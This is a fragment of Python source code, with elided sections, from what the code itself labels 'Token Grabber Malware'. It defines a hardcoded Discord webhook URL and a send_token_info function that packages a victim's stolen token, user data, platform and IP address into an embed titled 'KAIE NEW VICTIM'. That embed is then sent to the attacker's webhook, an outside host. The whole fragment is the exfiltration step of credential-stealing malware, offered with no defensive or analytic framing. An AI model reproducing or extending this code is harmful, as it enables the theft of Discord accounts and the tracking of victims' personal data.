...
WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1514328661849800724/yxdkscuOqdZdc2dhxFGlCzYJM6Drttfx0mXaZHM7ayYhP4h4-KgWkSkyZvK3JHtayrxG'
...
def send_token_info(token, user_data, platform, ip):
    try:
        ...
        embed = {
            ...
            "embeds": [{
                "author": {"name":"KAIE NEW VICTIM","icon_url":"https://cdn.discordapp.com/attachments/1460000685826510910/1460236959623680000/5f0528bb355baddf134d90e7ce045d11.jpg?ex=69662f25&is=6964dda5&hm=419b9066da720f4abd2ed709688e0ba6c6873555448cc99381e4fc16e2489d86&"},
                "description": "> KAIE ALWAYS WATCHING YOU | **WAG SUBUKAN ILEAK** | `Token Grabber Malware`",
                "color": 16711680,
                ...
                "footer":{"text":"/* Where the is a shell, there is a way */"}
            }]
        }
